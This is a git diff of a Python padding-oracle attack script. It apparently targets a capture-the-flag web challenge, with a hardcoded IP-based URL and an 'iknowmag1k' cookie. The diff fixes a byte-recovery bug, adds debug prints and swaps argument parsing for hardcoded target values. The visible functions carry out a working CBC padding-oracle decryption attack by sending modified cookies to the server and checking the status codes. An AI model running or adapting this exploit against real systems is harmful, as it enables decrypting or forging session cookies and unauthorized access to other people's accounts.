@@ -4,6 +4,7 @@ from binascii import hexlify, unhexlify
 from urllib.parse import quote, unquote
 import argparse
 import requests
+import pdb
 
 def unpaddingPKCS7(bytestr):
     i = bytestr[-1]
@@ -84,7 +85,7 @@ def decrypt_last_block(url, ciphertext, block_size, print_result = True):
                 if exam_ciphertext(url, quote(b64encode(ciphertext).decode())):
                     if print_result:
                         print("[+] Success: ({}/256) [Byte {}]".format(i + 1, block_size - len(known_bytes)))
-                    known_bytes = bytes([b]) + known_bytes
+                    known_bytes = bytes([i]) + known_bytes
                     break
         else:
             if print_result:
@@ -100,7 +101,9 @@ def decrypt_attack(url, encrypted_sample, block_size, encoding = 0, print_result
             print("\n*** Starting Block {} of {} ***\n".format(i, (len(encrypted_sample) // block_size)))
         
         cipher_text = encrypted_sample[:(i + 1) * block_size]
-        plain_text = decrypt_last_block(url, cipher_text, print_result)
+        plain_text = decrypt_last_block(url, cipher_text, block_size, print_result)
+        print(cipher_text[-block_size:])
+        print(plain_text)
         intermediate_bytes = bytes([cipher_text[-block_size + j] ^ plain_text[j] for j in range(block_size)])
 
         if i == (len(encrypted_sample) // block_size) - 1:
@@ -163,37 +166,43 @@ def parse_options():
 
 
 def exam_ciphertext(url, encrypted):
-    #print(encrypted)
+    
     cookie = {"iknowmag1k" : encrypted}
+    print(cookie)
     response = requests.post(url, cookies=cookie)
-
+    print(response)
     if response.status_code == 200:
         return True
     return False
 
 if __name__ == "__main__":
-    args = parse_options()
+    # args = parse_options()
 
-    #http://88.198.233.174:40068/profile.php
-    url = args.URL
-    encrypted_sample = args.EncryptedSample
-    block_size = args.BlockSize
-    if args.encoding:
-        encoding = args.encoding
-    else:
-        encoding = 0
+    # #http://88.198.233.174:40068/profile.php
+    # url = args.URL
+    # encrypted_sample = args.EncryptedSample
+    # block_size = args.BlockSize
+    # if args.encoding:
+    #     encoding = args.encoding
+    # else:
+    #     encoding = 0
 
-    if args.plaintext:
-        plaintext = args.plaintext
-        encrypt_attact(url, encrypted_sample, block_size, plaintext, encoding, True)
-    else:
-        
-        decrypt_attack(url, encrypted_sample, block_size, encoding, True)
+    # if args.plaintext:
+    #     plaintext = args.plaintext
+    #     #encrypt_attact(url, encrypted_sample, block_size, plaintext, encoding, True)
+    # else:
+    #     pass
+        #decrypt_attack(url, encrypted_sample, block_size, encoding, True)
 
-    # url = "http://88.198.233.174:40068/profile.php"
-    # cookie = {"iknowmag1k" : "tkmd8YTl%2B4Av6DlM8o3Rr1F523E0MF0Sh5jPFwa9pvgxMao8A9mSQA%3D%3D"}
-    # response = requests.post(url, cookies=cookie)
-    # print(response)
+    url = "http://88.198.233.174:40097/profile.php"
+    encrypted_sample = "GoDDEca7EaZmD9eVr0rBeC8we2jtRbamZ2W%2B%2BUJyL130mqn%2F71QdRQ%3D%3D"
+    block_size = 8
+    encoding = 1
+    #decrypt_attack(url, encrypted_sample, block_size, encoding, True)
+    cookie = {"iknowmag1k":"GoDDEca7EaZmD9eVr0rIeA%3D%3D"}
+    response = requests.post(url, cookies=cookie)
+    print(response.status_code)
+
 
 
 
